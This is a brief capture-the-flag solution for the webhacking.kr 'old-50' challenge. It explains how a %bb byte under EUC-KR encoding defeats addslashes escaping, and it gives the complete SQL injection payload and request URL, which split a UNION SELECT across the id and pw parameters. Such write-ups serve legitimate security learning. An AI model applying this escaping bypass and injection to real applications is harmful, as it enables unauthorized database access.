# Webhacking old-50 Solution

another sql injection.
here we use insert %bb and then, after the addslashes put `\` before the `'`, it'll take the %bb + `\` and encode in `euc-kr` format.

this is the payload i gave:

(notice that i added \**\, because i want that the union will be in the `pw`, because I can't put it inside id)
here we want to insert this: `id=%bb%27%0b/*&pw=*/union%0bselect%0b3%0b--%0b'`

this is the query i used in the http get
```
https://webhacking.kr/challenge/web-25/?id=%bb%27%0b/*&pw=*/union%0bselect%0b3%0b--%0b
```

s